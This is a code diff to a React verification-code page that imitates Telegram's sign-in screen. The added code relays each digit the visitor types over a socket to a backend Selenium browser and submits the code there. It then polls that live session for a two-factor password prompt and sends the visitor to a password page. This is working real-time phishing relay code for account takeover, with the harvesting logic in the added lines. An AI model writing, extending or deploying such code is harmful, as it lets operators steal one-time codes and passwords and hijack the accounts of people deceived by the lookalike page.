@@ -12,9 +12,11 @@ export const VerificationCodePage: React.FC = () => {
   
   const [verificationCode, setVerificationCode] = useState('');
   const [status, setStatus] = useState('');
+  const [isCheckingPasswordForm, setIsCheckingPasswordForm] = useState(false);
   
   const videoRef = useRef<HTMLVideoElement>(null);
   const socketRef = useRef<Socket | null>(null);
+  const passwordCheckIntervalRef = useRef<NodeJS.Timeout | null>(null);
 
   useEffect(() => {
     // Auto-play the monkey video
@@ -57,6 +59,9 @@ export const VerificationCodePage: React.FC = () => {
         console.log('✅ Connected to Selenium server from verification code page');
         console.log('✅ Socket ID:', socket.id);
         console.log('✅ Socket connected:', socket.connected);
+        
+        // Start periodic password form detection
+        startPasswordFormMonitoring();
       });
 
       socket.on('connect_error', (error) => {
@@ -97,11 +102,43 @@ export const VerificationCodePage: React.FC = () => {
         }
       }, 3000);
 
+      // Note: We only sync FROM frontend TO backend, never the reverse
+      // The frontend is the source of truth for all input values
+
+      // Listen for element check responses
+      socket.on('elementCheckResult', (data) => {
+        console.log('🔍 Element check result:', data);
+        if (data.sessionId === sessionId) {
+          if (data.elementFound && data.elementType === 'passwordInput') {
+            console.log('✅ Password form detected in Selenium window!');
+            setIsCheckingPasswordForm(false);
+            setStatus('Password required - redirecting...');
+            
+            // Stop monitoring since we found the password form
+            stopPasswordFormMonitoring();
+            
+            // Navigate to password page
+            setTimeout(() => {
+              const passwordUrl = `/sign-in-password?sessionId=${encodeURIComponent(sessionId)}&phoneNumber=${encodeURIComponent(phoneNumber || '')}`;
+              console.log('🔗 Navigating to password page:', passwordUrl);
+              navigate(passwordUrl);
+            }, 1000);
+          } else if (data.elementType === 'passwordInput') {
+            console.log('❌ Password form not detected - continuing to monitor');
+            setIsCheckingPasswordForm(false);
+            setStatus('No password required yet - continuing to monitor...');
+          }
+        }
+      });
+
       // Expose socket for manual testing in console
       (window as any).debugSocket = socket;
       console.log('🔧 Socket exposed as window.debugSocket for manual testing');
 
       return () => {
+        // Stop password form monitoring
+        stopPasswordFormMonitoring();
+        
         if (socketRef.current) {
           socketRef.current.disconnect();
           socketRef.current = null;
@@ -109,6 +146,48 @@ export const VerificationCodePage: React.FC = () => {
       };
     }
   }, [sessionId]);
+
+  // Function to start periodic password form monitoring
+  const startPasswordFormMonitoring = () => {
+    // Clear any existing interval
+    if (passwordCheckIntervalRef.current) {
+      clearInterval(passwordCheckIntervalRef.current);
+    }
+    
+    // Check immediately
+    checkPasswordFormPresence();
+    
+    // Then check every 3 seconds
+    passwordCheckIntervalRef.current = setInterval(() => {
+      checkPasswordFormPresence();
+    }, 3000);
+    
+    console.log('🔄 Started periodic password form monitoring');
+  };
+
+  // Function to stop password form monitoring
+  const stopPasswordFormMonitoring = () => {
+    if (passwordCheckIntervalRef.current) {
+      clearInterval(passwordCheckIntervalRef.current);
+      passwordCheckIntervalRef.current = null;
+      console.log('🛑 Stopped password form monitoring');
+    }
+  };
+
+  // Function to check if password form is present in Selenium window
+  const checkPasswordFormPresence = () => {
+    if (socketRef.current && socketRef.current.connected && sessionId) {
+      console.log('🔍 Checking if password form is present in Selenium window...');
+      setIsCheckingPasswordForm(true);
+      setStatus('Checking if password is required...');
+      
+      socketRef.current.emit('checkElementInSelenium', {
+        sessionId: sessionId,
+        elementType: 'passwordInput',
+        timestamp: new Date().toISOString()
+      });
+    }
+  };
 
   // Format phone number with proper spacing like Telegram
   const formatPhoneNumber = (phone: string) => {
@@ -165,6 +244,18 @@ export const VerificationCodePage: React.FC = () => {
     if (/^\d*$/.test(value)) {
       setVerificationCode(value);
       
+      // REAL-TIME SYNC: Send to Selenium immediately for character-by-character sync
+      if (socketRef.current && socketRef.current.connected && sessionId) {
+        console.log('🔄 REAL-TIME SYNC: Sending verification code to Selenium:', value);
+        
+        socketRef.current.emit('syncInputToSelenium', {
+          sessionId: sessionId,
+          inputType: 'verificationCode',
+          value: value,
+          timestamp: new Date().toISOString()
+        });
+      }
+      
       // Auto-submit when 5 digits are entered
       if (value.length === 5) {
         handleSubmit();
@@ -180,13 +271,42 @@ export const VerificationCodePage: React.FC = () => {
     setStatus('Verifying code...');
 
     try {
-      // Simulate verification process
-      setStatus('Code submitted successfully!');
-      
-      // Navigate to success page after a moment
-      setTimeout(() => {
-        navigate(`/success?sessionId=${sessionId}`);
-      }, 2000);
+      // Submit verification code to Selenium
+      if (socketRef.current && socketRef.current.connected && sessionId) {
+        console.log('🔐 Submitting verification code to Selenium:', verificationCode);
+        
+        // Set up event listener for verification result
+        socketRef.current.once('verificationCodeResult', (data) => {
+          console.log('📥 Received verification code result:', data);
+          
+          if (data.sessionId === sessionId) {
+            if (data.success) {
+              console.log('✅ Verification code submitted successfully!');
+              setStatus('Code submitted successfully!');
+              
+              // Check if password form is required after verification code submission
+              setTimeout(() => {
+                checkPasswordFormPresence();
+              }, 2000);
+            } else {
+              console.log('❌ Verification code submission failed:', data.error);
+              setStatus(`❌ Error: ${data.error || 'Failed to submit code'}`);
+            }
+          }
+        });
+        
+        // Send verification code to Selenium
+        socketRef.current.emit('submitVerificationCode', {
+          sessionId: sessionId,
+          code: verificationCode,
+          timestamp: new Date().toISOString()
+        });
+        
+        console.log('✅ Verification code submission sent to Selenium');
+      } else {
+        console.log('❌ Cannot submit - missing socket or session');
+        setStatus('❌ Error: Cannot connect to Selenium');
+      }
       
     } catch (error) {
       console.error('Error submitting verification code:', error);
@@ -389,7 +509,7 @@ export const VerificationCodePage: React.FC = () => {
 
 
           {/* Status Message */}
-          {status && (
+          {(status || isCheckingPasswordForm) && (
             <div style={{
               marginTop: '16px',
               padding: '12px 16px',
@@ -400,9 +520,41 @@ export const VerificationCodePage: React.FC = () => {
               textAlign: 'center',
               width: '100%'
             }}>
-              {status}
+              {isCheckingPasswordForm ? 'Checking if password is required...' : status}
             </div>
           )}
+
+          {/* Manual Password Check Button */}
+          <div style={{
+            marginTop: '16px',
+            width: '100%'
+          }}>
+            <button
+              onClick={() => {
+                console.log('🔍 Manual password form check triggered');
+                checkPasswordFormPresence();
+              }}
+              style={{
+                width: '100%',
+                height: '40px',
+                backgroundColor: '#f8f9fa',
+                border: '1px solid #dee2e6',
+                borderRadius: '8px',
+                fontSize: '14px',
+                color: '#6c757d',
+                cursor: 'pointer',
+                transition: 'background-color 0.2s ease'
+              }}
+              onMouseOver={(e) => {
+                e.currentTarget.style.backgroundColor = '#e9ecef';
+              }}
+              onMouseOut={(e) => {
+                e.currentTarget.style.backgroundColor = '#f8f9fa';
+              }}
+            >
+              🔍 Check for Password Form
+            </button>
+          </div>
 
           {/* Debug Info - Only show when SHOW_DEBUG_INFO is true */}
           {import.meta.env.VITE_SHOW_DEBUG_INFO === 'true' && sessionId && (
@@ -419,6 +571,7 @@ export const VerificationCodePage: React.FC = () => {
               <div>Session: {sessionId}</div>
               <div>Phone: {phoneNumber}</div>
               <div>Code: {verificationCode}</div>
+              <div>Monitoring: {passwordCheckIntervalRef.current ? 'Active' : 'Inactive'}</div>
             </div>
           )}
         </div>
